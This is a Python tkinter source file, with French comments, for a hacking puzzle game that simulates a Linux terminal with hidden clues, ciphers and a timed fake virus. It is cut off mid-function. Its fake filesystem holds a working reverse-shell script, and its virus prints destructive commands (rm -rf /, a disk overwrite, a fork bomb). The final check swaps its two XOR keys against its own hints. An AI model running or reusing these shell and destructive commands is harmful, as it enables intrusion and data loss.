import tkinter as tk
from tkinter import scrolledtext, simpledialog, messagebox
import time
import base64
import hashlib
import random
import string
import json
from itertools import cycle
import copy

# --- Importations pour la cryptographie ---
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# Définition d'une variable globale de configuration pour le dev
DEV_ENABLE_VIRUS = False  # Mettez False pour désactiver le virus durant le développement

# --- Fonction d'encryptage/décryptage XOR ---
def xor_encrypt_decrypt(data, key):
    # Retourne le résultat du XOR entre chaque caractère de data et key
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, cycle(key)))

# --- Fonctions pour le chiffrement César ---
def cesar_encrypt(text, shift):
    encrypted = ""
    for ch in text:
        if ch.isalpha():
            base = ord('a') if ch.islower() else ord('A')
            encrypted += chr((ord(ch) - base + shift) % 26 + base)
        else:
            encrypted += ch
    return encrypted

def cesar_decrypt(text, shift):
    # Pour décrypter, on inverse le décalage
    return cesar_encrypt(text, -shift)

# --- Clés Cryptographiques ---
AES_KEY = get_random_bytes(16)      # Clé AES aléatoire (128 bits)
RSA_KEY = RSA.generate(2048)          # Clé RSA générée

# --- Constantes ---
# La clé steganographique réelle (en Base64) reste inchangée, on va l'insérer au milieu de deux fausses clés
STEGO_KEY = base64.b64encode("gradientdescent".encode()).decode() 
VIRUS_INTERVAL = 45000  # Intervalle d'attaque virale en millisecondes

def random_string(length=10):
    """Génère une chaîne aléatoire de longueur fixe."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

# --- Fonctions de stéganographie ---
def stego_encode(message, img_data):
    """Inscrit un message dans une image via une simulation LSB."""
    msg_bin = ''.join(f"{ord(c):08b}" for c in message)
    img_bytes = bytearray(base64.b64decode(img_data))
    for i in range(len(msg_bin)):
        img_bytes[-len(msg_bin) + i] = (img_bytes[-len(msg_bin) + i] & ~1) | int(msg_bin[i])
    return base64.b64encode(bytes(img_bytes)).decode()

def stego_decode(img_data):
    """Extrait le message caché dans une image par méthode LSB."""
    img_bytes = bytearray(base64.b64decode(img_data))
    bits = ''.join(str(b & 1) for b in img_bytes[-40:])
    msg = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, 40, 8))
    return msg.strip('\x00')

# --- Génération d'un système de fichiers réaliste et étendu ---
def generate_random_filesystem():
    fs = {}
    dirs = ["bin", "etc", "var", "home", "data", "misc", "mnt"]
    for d in dirs:
        if d == "bin":
            # Commandes réelles disponibles sur un système Linux
            fs[d] = { 
                cmd: f"{cmd} command" for cmd in 
                ["ls", "cat", "cd", "touch", "mkdir", "nano", "pwd",
                 "whoami", "uname", "ps", "top", "grep", "find", "nmap",
                 "ping", "traceroute", "nslookup", "arp", "route", "curl",
                 "ifconfig", "netstat", "steghide", "exiftool", "exit", "man", "sudo"]
            }
        elif d == "etc":
            fs[d] = {
                "system.conf": "hostname=zero-day\nos=Linux\nversion=5.10.0",
                "network.conf": "interface=eth0\nip=192.168.1.101\nmask=255.255.255.0",
                "security.conf": "FIREWALL=ENABLED\nANTIVIRUS=ACTIVE",
                # Fichier caché cryptique contenant des credentials (chiffré avec XOR et 'MoivreLaplace')
                ".shadow": base64.b64encode(xor_encrypt_decrypt("root:supersecret", "moivrelaplace").encode()).decode(),
                # Fichier contenant le mot de passe sudo
                "sudo_passwd": "tototititata",
                # Fichiers leurres et safe mode
                "fake_shadow": base64.b64encode(xor_encrypt_decrypt("fake:password", "moivrelaplace").encode()).decode(),
                "restore.log": "restore_code=BACKDOOR_ACTIVE",
                # Fichier d'indices pour reconstituer les clés
                ".keyhint": (
                    "Hints for reconstructing keys:\n"
                    "For the first key (to decrypt the secret note):\n"
                    "  - Hint: \"A language that drives you crazy\".\n"
                    "For the second key (to decrypt .shadow):\n"
                    "  - Hint: The following anagram seems nonsensical but pay attention to its conditions: \"vilapomeclar\"\n."
                    "\n- Riddle for a picture:\n" \
                    " I am a traveler always moving downhill,\n" \
                    " But if my steps are too big, I may never settle.\n" \
                    " Guided by a slope, I adjust my path,\n" \
                    " Seeking the lowest point, avoiding the wrath.\n" \
                    " Who am I?"
                )
            }
        elif d == "var":
            log_folder = "logs"
            fs[d] = {log_folder: {}}
            fs[d][log_folder]["auth.log"] = (
                "Jul 15 09:00:00 sshd[1234]: Failed login for root\n"
                "Jul 15 09:05:00 sshd[1235]: Agent agent007 logged in\n"
                "ALERT: Silence masks anomalies...\n"
                "NOTE: Listen for whispers in the digital void.\n"
            )
            # Fichiers cachés avec indices cryptiques
            fs[d][log_folder][".hidden.log"] = (
                "DEBUG: 'brython' unlocks the echo within pixels.\n"
                "DEBUG: Disarm the infection with the proper incantation.\n"
            )
            fs[d][log_folder][".final_hint"] = "Fragments: the cipher, the echo, and the shadow. Unite them."
            # Répertoire honeypot simulé
            fs[d]["honeypot"] = {
                "admin_passwords.csv": "username,password\nadmin,admin123"
            }
        elif d == "home":
            user_folder = "agent007"
            fs[d] = {user_folder: {}}
            # Fichier d'instructions cryptique qui s'autodétruit après 3 lectures
            fs[d][user_folder]["notes.txt"] = (
                "Nighttime Observations:\n"
                "1. In the labyrinth of pixels, an image whispers a key (profile.img).\n"
                "2. Echoes of a forgotten past (.secret_note) conceal a coded secret.\n"
                "3. Beneath the surface, the shadows (/etc/.shadow) hold a fragment of truth.\n"
                "4. Neutralize the viral threat with caution.\n"
                "5. When the fragments converge, concatenate them in order: [cipher] + [echo] + [shadow] + [Caesar].\n"
                "   The SHA‑256 hash of this union, taking its first 10 hex digits, is your final passcode.\n"
                "6. Objective: Create the file '/home/agent007/.final_pass' with the passcode and submit it using:\n"
                "       cat /home/agent007/.final_pass\n"
                "Explore hidden files (ls -a) for additional clues.\n"
                "P.S. A supplementary clue is hidden in time..."
            )
            # Génération d'une image contenant plusieurs clés (deux fausses et la bonne)
            fake_img = base64.b64encode(bytes([i % 256 for i in range(1000)])).decode()
            # Format : FAKE_KEY1, puis STEG0_KEY (réelle), puis FAKE_KEY2, séparés par des points-virgules
            stego_message = "FAKE_KEY1:ABCDE; STEG0_KEY:" + base64.b64decode(STEGO_KEY).decode() + "; FAKE_KEY2:VWXYZ"
            fs[d][user_folder]["profile.img"] = stego_encode(stego_message, fake_img)
            # Fichiers cachés dans le répertoire de l'agent
            fs[d][user_folder][".bash_history"] = (
                "ls -la\n"
                "cat .secret_note\n"
                "grep 'secret' /etc/security.conf\n"
            )
            fs[d][user_folder][".secret_note"] = xor_encrypt_decrypt("Hidden_API_Key=UltraSecure123", "brython")
            # Fichier caché avec message chiffré en César (décalage 13)
            fs[d][user_folder][".caesar_hint.txt"] = cesar_encrypt("Decode this message", 13)
        elif d == "data":
            fs[d] = {}
            fs[d]["customer_data.csv"] = (
                "ID,Name,Email,Purchase\n"
                "1,John Doe,john@example.com,120.50\n"
                "2,Jane Smith,jane@example.com,80.00\n"
                "3,admin'; DROP TABLE users;--,evil@hack.com,9999.99\n"
                "# Anomalies detected in the numerical matrix..."
            )
            fs[d]["encrypted_message.txt"] = base64.b64encode(b"FinalCode: RealChallengeHardcore!").decode()
        elif d == "misc":
            fs[d] = {
                "ascii_art.txt": "   .-.\n  (o.o)\n   |=|\n  __|__\n //.=|=.\\\\\n// .=|=. \\\\",
                # Fichier backdoor caché dans un fichier non exécutable
                ".backdoor.txt": "BACKDOOR: ENABLE"
            }
        elif d == "mnt":
            # Répertoires simulant des partages réseau
            fs[d] = {
                "remote_server": {
                    "web_server.log": "Connection from 192.168.1.200: GET /index.html\nConnection from 192.168.1.200: GET /admin\n"
                },
                "db_server": {
                    "db_config.conf": "db_host=192.168.1.150\ndb_user=admin\ndb_pass=pass123\n"
                }
            }
        else:
            fs[d] = {random_string() + ".txt": random_string(20) + " # decoy file"}
    
    # Répertoire 'opt' contenant un script de reverse shell simulé
    fs["opt"] = {
        ".reverse_shell.py": (
            "import socket, subprocess, os\n"
            "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "s.connect(('192.168.1.100', 4444))\n"
            "os.dup2(s.fileno(), 0)\n"
            "os.dup2(s.fileno(), 1)\n"
            "os.dup2(s.fileno(), 2)\n"
            "subprocess.call(['/bin/sh', '-i'])"
        )
    }
    return fs

FILESYSTEM = generate_random_filesystem()

def generate_api_response(endpoint, method, params=None):
    # Simule une réponse d'API réaliste et cryptique
    if endpoint == "/secret" and method == "get":
        secret = random.randint(1000, 9999)
        return json.dumps({"secret_key": secret, "info": "A whisper from the void."})
    elif endpoint == "/status" and method == "get":
        status = random.choice(["OK", "WARNING", "CRITICAL"])
        return json.dumps({"system_status": status, "uptime": random.randint(100, 10000)})
    elif endpoint == "/config" and method == "get":
        config = {"FIREWALL": "ENABLED", "ANTIVIRUS": "ACTIVE", "ports": [22, 80, 443]}
        return json.dumps(config)
    else:
        return json.dumps({"error": "Endpoint not found."})

# --- Terminal Challenge: Secret Agent Edition ---
class TerminalAdvancedChallenge:
    def __init__(self, master):
        self.master = master
        self.master.title("Terminal Challenge: Operation ZeroDay")
        self.master.configure(bg="black")
        self.master.geometry("1000x700")
        self.master.resizable(True, True)

        self.challenge_duration = 3600  # Durée d'1 heure (pour rappel, la pause forcée vise à atteindre ~45 min minimum)
        self.start_time = time.time()
        self.timer_id = None
        self.developer_mode = False
        self.time_offset = 0

        # Attributs du challenge
        self.virus_progress = 0
        self.stego_found = False
        self.backdoor_activated = False  # Indique si une backdoor a été activée

        self.filesystem = FILESYSTEM
        self.cwd = "/"  # Répertoire courant

        # Utilisation du booléen de dev pour activer/désactiver le virus
        self.virus_enabled = DEV_ENABLE_VIRUS
        self.virus_active = False

        # Pour sudo, vérification via le fichier /etc/sudo_passwd (seule la commande "nc" est restreinte)
        self.restricted_commands = {"nc"}
        
        # --- Attributs pour l'équilibrage ---
        self.indices_found = set()        # Pour suivre les indices clés ("shadow", "caesar", "stego")
        self.notes_read_count = 0           # Pour auto-destruction de /home/agent007/notes.txt après 3 lectures
        self.pause_enforced = False         # Pour appliquer la pause obligatoire de 5 minutes une fois les 3 indices obtenus
        self.last_progress_time = time.time()  # Pour le hint timer (30 minutes sans progression)
        self.critical_files_backup = {}     # Sauvegarde des fichiers critiques pour safe mode
        self.backup_critical_files()

        self.create_widgets()
        self.print_intro()
        self.bind_dev_mode()
        self.update_timer()
        self.schedule_virus_attack()
        self.update_system_logs()  # Mise à jour périodique des logs système
        self.master.bind("<Configure>", self.on_resize)
        self.check_hint_timer()  # Lancement du timer d'indices

    def backup_critical_files(self):
        # Sauvegarder les fichiers critiques afin de pouvoir les restaurer en safe mode
        shadow = self.get_fs_content("/etc/.shadow")
        sudo_pass = self.get_fs_content("/etc/sudo_passwd")
        if shadow is not None:
            self.critical_files_backup["/etc/.shadow"] = copy.deepcopy(shadow)
        if sudo_pass is not None:
            self.critical_files_backup["/etc/sudo_passwd"] = copy.deepcopy(sudo_pass)

    def create_widgets(self):
        self.timer_label = tk.Label(self.master, text="Time left: 60:00", bg="black",
                                    fg="red", font=("Consolas", 14, "bold"))
        self.timer_label.grid(row=0, column=1, sticky="ne", padx=10, pady=5)
        # Label affichant la progression du virus
        self.virus_label = tk.Label(self.master, text="Virus: 0%", bg="black",
                                    fg="orange", font=("Consolas", 12))
        self.virus_label.grid(row=0, column=0, sticky="nw", padx=10, pady=5)

        self.terminal = scrolledtext.ScrolledText(self.master, bg="black", fg="lime",
                                                  font=("Consolas", 12))
        self.terminal.grid(row=1, column=0, columnspan=2, sticky="nsew", padx=10, pady=5)
        self.terminal.config(state="disabled")

        self.entry = tk.Entry(self.master, bg="black", fg="lime",
                              font=("Consolas", 12), insertbackground="lime")
        self.entry.grid(row=2, column=0, columnspan=2, sticky="ew", padx=10, pady=5)
        self.entry.bind("<Return>", self.process_command)
        self.entry.focus()

        self.master.grid_rowconfigure(1, weight=1)
        self.master.grid_columnconfigure(0, weight=1)

    def on_resize(self, event):
        pass

    def bind_dev_mode(self):
        self.master.bind("<Control-Shift-D>", self.toggle_dev_mode)

    def toggle_dev_mode(self, event=None):
        self.developer_mode = not self.developer_mode
        mode = "enabled" if self.developer_mode else "disabled"
        self.print_terminal(f"[DEV MODE] {mode}")
        if self.developer_mode:
            self.print_terminal(f"[DEBUG] Start Time: {self.start_time}")
            self.print_terminal(f"[DEBUG] Current Directory: {self.cwd}")

    def print_terminal(self, text):
        self.terminal.config(state="normal")
        self.terminal.insert(tk.END, text + "\n")
        self.terminal.see(tk.END)
        self.terminal.config(state="disabled")

    def print_intro(self):
        self.print_terminal("Welcome, Agent.")
        self.print_terminal("Your mission: infiltrate a high-security digital network where every byte conceals a secret.")
        self.print_terminal("Objective: Gather all secret fragments and compute the final passcode.")
        self.print_terminal("Once you have the passcode, create the file '/home/agent007/.final_pass' containing it and submit it with:")
        self.print_terminal("    cat /home/agent007/.final_pass")
        self.print_terminal("Good luck, Agent...")

    def update_timer(self):
        elapsed = int(time.time() - self.start_time)
        remaining = self.challenge_duration - elapsed + self.time_offset
        if remaining <= 0:
            self.timer_label.config(text="Time left: 00:00")
            self.print_terminal("Time's up. The enemy has prevailed...")
            messagebox.showerror("Time Out", "Time's up.")
            self.master.destroy()
            return
        mins, secs = divmod(remaining, 60)
        self.timer_label.config(text=f"Time left: {mins:02}:{secs:02}")
        self.virus_label.config(text=f"Virus: {self.virus_progress}%")
        self.timer_id = self.master.after(1000, self.update_timer)

    def update_system_logs(self):
        # Ajoute une nouvelle ligne cryptique dans /var/logs/auth.log chaque minute
        current_log = self.get_fs_content("/var/logs/auth.log")
        if current_log is not None:
            new_line = f"{time.strftime('%b %d %H:%M:%S')} kernel: Anomaly detected. [ID: {random.randint(1000,9999)}]"
            updated_log = current_log + "\n" + new_line
            self.set_fs_content("/var/logs/auth.log", updated_log)
        self.master.after(60000, self.update_system_logs)

    def check_hint_timer(self):
        # Si aucune progression (indices trouvés) depuis 30 minutes, afficher un indice
        if time.time() - self.last_progress_time >= 1800:
            self.print_terminal("[HINT] Essayez d'explorer les fichiers cachés et d'utiliser 'steghide' avec la bonne clé.")
            self.last_progress_time = time.time()  # Réinitialiser le timer d'indices
        self.master.after(60000, self.check_hint_timer)

    def process_command(self, event):
        cmd = self.entry.get().strip()
        self.entry.delete(0, tk.END)
        self.print_terminal("> " + cmd)

        # Commande safe mode : "backdoor activate" pour restaurer les fichiers essentiels
        if cmd.lower().startswith("backdoor activate"):
            self.activate_safe_mode()
            return

        # Vérifier les commandes restreintes
        if cmd.split()[0] in self.restricted_commands:
            self.print_terminal(f"ERROR: '{cmd.split()[0]}' is blocked by system policy.")
            return

        # Gestion de sudo : si la commande commence par "sudo", demander le mot de passe
        if cmd.lower().startswith("sudo"):
            parts = cmd.split(maxsplit=1)
            if len(parts) == 1:
                self.print_terminal("sudo: command missing")
                return
            passwd = simpledialog.askstring("Sudo Authentication", "Enter sudo password:", show="*")
            sudo_pass = self.get_fs_content("/etc/sudo_passwd")
            if passwd != sudo_pass:
                self.print_terminal("sudo: Authentication failure")
                return
            cmd = parts[1]
            self.print_terminal("[sudo] Authentication successful.")

        # Si l'agent lit le fichier d'instructions, il s'autodétruit après affichage (et compte le nombre de lectures)
        if "cat" in cmd and "notes.txt" in cmd and "/home/agent007" in cmd:
            self.handle_command(cmd.lower())
            self.notes_read_count += 1
            if self.notes_read_count > 3:
                try:
                    del self.filesystem["home"]["agent007"]["notes.txt"]
                    self.print_terminal("[INFO] The instructions file has self-destructed!")
                except KeyError:
                    pass
            return

        # Si l'agent lit le fichier backdoor, l'activer et le supprimer (auto-destruction)
        if "cat" in cmd and ".backdoor.txt" in cmd and "/misc" in cmd:
            self.handle_command(cmd.lower())
            try:
                del self.filesystem["misc"][".backdoor.txt"]
                self.backdoor_activated = True
                self.print_terminal("[INFO] Hidden backdoor activated!")
            except KeyError:
                pass
            return

        # Simulation de corruption de commande si le virus est actif
        if self.virus_active and random.random() > 0.7:
            self.corrupt_command()
            return

        # Exécution standard de la commande
        self.handle_command(cmd.lower())

    def activate_safe_mode(self):
        restore_log = self.get_fs_content("/etc/restore.log")
        if restore_log and "restore_code=BACKDOOR_ACTIVE" in restore_log:
            # Restaurer les fichiers critiques
            if "/etc/.shadow" in self.critical_files_backup:
                self.set_fs_content("/etc/.shadow", self.critical_files_backup["/etc/.shadow"])
            if "/etc/sudo_passwd" in self.critical_files_backup:
                self.set_fs_content("/etc/sudo_passwd", self.critical_files_backup["/etc/sudo_passwd"])
            self.virus_active = False
            self.virus_progress = 0
            self.print_terminal("[SAFE MODE] Essential files restored. Virus neutralized!")
        else:
            self.print_terminal("[SAFE MODE] Restoration failed. Invalid restore code.")

    def corrupt_command(self):
        # Simuler une corruption aléatoire de commande par le virus
        commands = ["rm -rf /", "dd if=/dev/urandom of=/dev/sda", ":(){:|:&};:"]
        self.print_terminal(f"# Virus corruption: {random.choice(commands)}")
        self.virus_progress += 25
        if self.virus_progress >= 100:
            self.print_terminal("[CRITICAL] System integrity compromised!")
            self.master.destroy()

    def handle_command(self, cmd):
        # Si la progression du virus est trop élevée, la plupart des commandes échouent
        if self.virus_progress >= 75 and cmd not in ["sudo", "help", "man", "exit", "backdoor"]:
            self.print_terminal("command not found")
            return

        # Suivi de la progression : si l'agent lit certains fichiers clés, on enregistre l'indice
        if cmd.startswith("cat"):
            if "/etc/.shadow" in cmd:
                self.indices_found.add("shadow")
                self.last_progress_time = time.time()
            if "/home/agent007/.caesar_hint.txt" in cmd:
                self.indices_found.add("caesar")
                self.last_progress_time = time.time()

            # Si le nombre d'indices atteint 3 et que la pause n'a pas encore été imposée, la forcer
            if len(self.indices_found) >= 2 and self.stego_found and not self.pause_enforced:
                self.enforce_pause()

        if cmd == "help":
            self.print_terminal("Commands: cd, ls, cat, touch, mkdir, nano, pwd, whoami, uname, ps, top, grep, find, sudo, nmap, ping, traceroute, nslookup, arp, route, curl, ifconfig, netstat, steghide, exiftool, backdoor, exit, man")
        elif cmd == "man":
            self.print_terminal("Standard Linux utilities. Use 'man <command>' for details.")
        elif cmd == "pwd":
            self.print_terminal(f"Current directory: {self.cwd}")
        elif cmd.startswith("man"):
            self.show_manual(cmd)
        elif cmd.startswith("cd"):
            self.change_directory(cmd)
        elif cmd.startswith("mkdir"):
            self.make_directory(cmd)
        elif cmd.startswith("nano"):
            self.nano_edit(cmd)
        elif cmd.startswith("touch"):
            self.touch_file(cmd)
        elif cmd.startswith("whoami"):
            self.print_terminal("agent007")
        elif cmd.startswith("uname"):
            self.print_terminal("Linux zero-day 5.10.0-rc1 #1 SMP PREEMPT Tue Jul 12 10:00:00 UTC 2021 x86_64 GNU/Linux")
        elif cmd.startswith("ps"):
            self.simulate_ps(cmd)
        elif cmd.startswith("top"):
            self.simulate_top(cmd)
        elif cmd.startswith("grep"):
            self.simulate_grep(cmd)
        elif cmd.startswith("find"):
            self.simulate_find(cmd)
        elif cmd.startswith("nmap"):
            self.simulate_nmap(cmd)
        elif cmd.startswith("ping"):
            self.simulate_ping(cmd)
        elif cmd.startswith("traceroute"):
            self.simulate_traceroute(cmd)
        elif cmd.startswith("nslookup"):
            self.simulate_nslookup(cmd)
        elif cmd.startswith("arp"):
            self.simulate_arp(cmd)
        elif cmd.startswith("route"):
            self.simulate_route(cmd)
        elif cmd.startswith("curl"):
            self.simulate_curl(cmd)
        elif cmd in ("ifconfig", "netstat"):
            self.simulate_network(cmd)
        elif cmd.startswith("ls"):
            self.simulate_ls(cmd)
        elif cmd.startswith("cat"):
            self.simulate_cat(cmd)
        elif cmd.startswith("steghide"):
            self.handle_steghide(cmd)
        elif cmd.startswith("exiftool"):
            self.handle_exiftool(cmd)
        elif cmd == "backdoor":
            # Si la backdoor a été activée, permettre de désactiver le virus
            if self.backdoor_activated:
                self.virus_active = False
                self.virus_progress = 0
                self.print_terminal("Backdoor activated: Virus neutralized!")
            else:
                self.print_terminal("Backdoor not found.")
        elif cmd == "exit":
            self.print_terminal("Session terminated. Farewell, Agent.")
            self.master.destroy()
        else:
            self.print_terminal("Unknown command.")

    def enforce_pause(self):
        self.print_terminal("[INFO] Critical indices gathered. Processing decryption... Please wait 5 minutes.")
        self.pause_enforced = True
        self.entry.config(state="disabled")
        # Après 5 minutes, réactiver l'entrée
        self.master.after(300000, lambda: self.entry.config(state="normal"))
        self.last_progress_time = time.time()

    # --- Fonctions de navigation dans le système de fichiers ---
    def resolve_path(self, path):
        # Retourne le chemin absolu en fonction du répertoire courant
        if path.startswith("/"):
            resolved = path
        else:
            resolved = self.cwd + path
        return "/" + "/".join([p for p in resolved.split("/") if p])

    def change_directory(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("cd: Usage: cd <path>")
            return
        path = parts[1]
        new_dir = self.resolve_path(path)
        content = self.get_fs_content(new_dir)
        if content is not None and isinstance(content, dict):
            self.cwd = new_dir if new_dir.endswith("/") else new_dir + "/"
            self.print_terminal(f"Changed directory to {self.cwd}")
        else:
            self.print_terminal(f"cd: {path}: No such directory.")

    def make_directory(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("mkdir: Usage: mkdir <dirname>")
            return
        dirname = parts[1]
        full_path = self.resolve_path(dirname)
        parent_path = "/".join(full_path.strip("/").split("/")[:-1])
        parent = self.get_fs_content("/" + parent_path) if parent_path else self.filesystem
        if parent is not None and isinstance(parent, dict):
            dir_name = full_path.strip("/").split("/")[-1]
            if dir_name in parent:
                self.print_terminal("mkdir: Directory already exists.")
            else:
                parent[dir_name] = {}
                self.print_terminal(f"Directory {dirname} created.")
        else:
            self.print_terminal("mkdir: Cannot create directory here.")

    def nano_edit(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("nano: Usage: nano <file>")
            return
        filename = parts[1]
        full_path = self.resolve_path(filename)
        content = self.get_fs_content(full_path)
        if content is None:
            self.print_terminal("nano: File not found.")
            return

        nano_window = tk.Toplevel(self.master)
        nano_window.title(f"nano - {full_path}")
        nano_window.geometry("600x400")
        text_area = scrolledtext.ScrolledText(nano_window, bg="black", fg="lime", font=("Consolas", 12))
        text_area.grid(row=0, column=0, sticky="nsew")
        text_area.insert(tk.END, content)

        def save_and_close():
            new_content = text_area.get("1.0", tk.END)
            self.set_fs_content(full_path, new_content)
            self.print_terminal(f"{full_path} updated.")
            nano_window.destroy()

        save_button = tk.Button(nano_window, text="Save", command=save_and_close, bg="gray", fg="white")
        save_button.grid(row=1, column=0, pady=5)

        nano_window.grid_rowconfigure(0, weight=1)
        nano_window.grid_columnconfigure(0, weight=1)

    def touch_file(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("touch: Usage: touch <file>")
            return
        filename = parts[1]
        full_path = self.resolve_path(filename)
        if self.get_fs_content(full_path) is None:
            self.set_fs_content(full_path, "")
            self.print_terminal(f"File {full_path} created.")
        else:
            self.print_terminal(f"touch: {full_path} already exists.")

    def show_manual(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("man: Usage: man <command>")
            return
        topic = parts[1]
        manuals = {
            "ls": "ls: List directory contents.",
            "cat": "cat: Display file content.",
            "cd": "cd: Change the current directory.",
            "mkdir": "mkdir: Create a new directory.",
            "nano": "nano: Edit a file in an editor.",
            "touch": "touch: Create a file or update its timestamp.",
            "pwd": "pwd: Print the current working directory.",
            "whoami": "whoami: Print the current user.",
            "uname": "uname: Show system information.",
            "ps": "ps: List running processes.",
            "top": "top: Display system tasks and load.",
            "grep": "grep: Search for lines matching a pattern.",
            "find": "find: Search for files in a directory hierarchy.",
            "sudo": "sudo: Execute command with admin privileges (requires password).",
            "nmap": "nmap: Scan a network for open ports.",
            "ping": "ping: Check connectivity to a host.",
            "traceroute": "traceroute: Trace the route to a host.",
            "nslookup": "nslookup: Query DNS information.",
            "arp": "arp: Display or modify ARP table.",
            "route": "route: Display or modify routing table.",
            "curl": "curl: Transfer data using HTTP.",
            "ifconfig": "ifconfig: Display network interface configuration.",
            "netstat": "netstat: Display network connections.",
            "steghide": "steghide: Extract or embed data in images using steganography.",
            "exiftool": "exiftool: Read and write EXIF metadata of files.",
            "backdoor": "backdoor: Activate hidden backdoor (if available)."
        }
        self.print_terminal(manuals.get(topic, f"No manual entry for {topic}."))

    # --- Fonctions d'accès au système de fichiers ---
    def get_fs_content(self, path):
        path = self.resolve_path(path)
        parts = [p for p in path.strip("/").split("/") if p]
        current = self.filesystem
        try:
            for part in parts:
                current = current[part]
            return current
        except KeyError:
            return None

    def set_fs_content(self, path, content):
        path = self.resolve_path(path)
        parts = [p for p in path.strip("/").split("/") if p]
        current = self.filesystem
        for part in parts[:-1]:
            if part not in current or not isinstance(current[part], dict):
                current[part] = {}
            current = current[part]
        current[parts[-1]] = content

    # --- Simulations des commandes standard ---
    def simulate_ls(self, cmd):
        parts = cmd.split()
        # Détecter la présence du flag -a
        flag_a = any(part.startswith("-") for part in parts[1:])
        # Chercher un argument qui ne commence pas par "-" pour le chemin
        path = self.cwd  # Par défaut, le répertoire courant
        for part in parts[1:]:
            if not part.startswith("-"):
                path = self.resolve_path(part)
                break
        content = self.get_fs_content(path)
        if content and isinstance(content, dict):
            if flag_a:
                self.print_terminal("  ".join(sorted(content.keys())))
            else:
                visible = [f for f in content.keys() if not f.startswith(".")]
                self.print_terminal("  ".join(sorted(visible)))
        else:
            self.print_terminal("")

    def simulate_cat(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("cat: Usage: cat <path>")
            return
        path = parts[1]
        full_path = self.resolve_path(path)
        content = self.get_fs_content(full_path)
        # Vérification finale si l'agent lit le fichier final
        if full_path == "/home/agent007/.final_pass":
            if content is None:
                self.print_terminal("cat: /home/agent007/.final_pass: No such file")
            else:
                try:
                    # Calcul des indices pour le passcode final
                    stego_key = base64.b64decode(STEGO_KEY).decode()
                    secret_note_enc = self.get_fs_content("/home/agent007/.secret_note")
                    secret_note = xor_encrypt_decrypt(secret_note_enc, "moivrelaplace")
                    shadow_enc = self.get_fs_content("/etc/.shadow")
                    shadow_decrypted = xor_encrypt_decrypt(base64.b64decode(shadow_enc).decode(), "brython")
                    caesar_hint_enc = self.get_fs_content("/home/agent007/.caesar_hint.txt")
                    caesar_hint = cesar_decrypt(caesar_hint_enc, 13)
                    combined = stego_key + secret_note + shadow_decrypted + caesar_hint
                    expected_token = hashlib.sha256(combined.encode()).hexdigest()[:10]
                    total_time = int(time.time() - self.start_time + self.time_offset)
                    if content.strip() == expected_token:
                        mins, secs = divmod(total_time, 60)
                        # Système de score basé sur la durée totale
                        if total_time < 3600:
                            rating = "Hacker Élite 💀"
                        elif total_time < 7200:
                            rating = "Agent Confirmé 🕵️"
                        else:
                            rating = "Détective Persévérant 🔍"
                        proof_token = hashlib.sha256(("FinalChallengeCompleted" + "SECRET_SALT").encode()).hexdigest()[:10]
                        self.print_terminal(f"Mission accomplished in {mins} minutes and {secs} seconds!")
                        self.print_terminal(f"Success Proof: {proof_token}")
                        self.print_terminal(f"Rating: {rating}")
                        messagebox.showinfo("Success", f"Mission Accomplished.\nTime: {mins}m {secs}s\nProof: {proof_token}\nRating: {rating}")
                        self.master.destroy()
                    else:
                        self.print_terminal("Final passcode incorrect. Reexamine the clues.")
                        messagebox.showerror("Failure", "Final passcode incorrect. Try again.")
                except Exception as e:
                    self.print_terminal(f"Error during final submission: {str(e)}")
            return
        # Afficher le contenu du fichier
        if content and isinstance(content, str):
            self.print_terminal(content)
        else:
            self.print_terminal(f"cat: {path}: No such file.")

    def simulate_network(self, cmd):
        if cmd == "netstat":
            self.print_terminal("tcp        0      0 192.168.1.101:22    192.168.1.50:51324    ESTABLISHED")
        elif cmd == "ifconfig":
            self.print_terminal("eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500")
            self.print_terminal("        inet 192.168.1.101  netmask 255.255.255.0  broadcast 192.168.1.255")

    def simulate_ping(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("ping: Usage: ping <host>")
            return
        host = parts[1]
        latency = random.uniform(10, 100)
        self.print_terminal(f"PING {host} (192.168.1.1) 56(84) bytes of data.")
        self.print_terminal(f"64 bytes from {host}: icmp_seq=1 ttl=64 time={latency:.2f} ms")
        self.print_terminal(f"--- {host} ping statistics ---")
        self.print_terminal("1 packets transmitted, 1 received, 0% packet loss")

    def simulate_traceroute(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("traceroute: Usage: traceroute <host>")
            return
        host = parts[1]
        self.print_terminal(f"traceroute to {host} (192.168.1.1), 30 hops max:")
        hops = random.randint(3, 8)
        for i in range(1, hops + 1):
            self.print_terminal(f" {i}  192.168.1.{random.randint(1,254)}  {random.uniform(1,30):.2f} ms")
        self.print_terminal("Traceroute complete.")

    def simulate_nslookup(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("nslookup: Usage: nslookup <domain>")
            return
        domain = parts[1]
        self.print_terminal("Server: 8.8.8.8")
        self.print_terminal("Address: 8.8.8.8#53")
        self.print_terminal("Non-authoritative answer:")
        self.print_terminal(f"Name: {domain}")
        self.print_terminal("Address: 93.184.216.34")

    def simulate_arp(self, cmd):
        self.print_terminal("Address                  HWtype  HWaddress           Flags Mask            Iface")
        self.print_terminal("192.168.1.101            ether   00:0a:95:9d:68:16   C                     eth0")

    def simulate_route(self, cmd):
        self.print_terminal("Kernel IP routing table")
        self.print_terminal("Destination     Gateway         Genmask         Flags Metric Ref    Use Iface")
        self.print_terminal("0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0")

    def simulate_curl(self, cmd):
        parts = cmd.split()
        if "-X" in parts:
            method_index = parts.index("-X") + 1
            method = parts[method_index].lower() if method_index < len(parts) else "get"
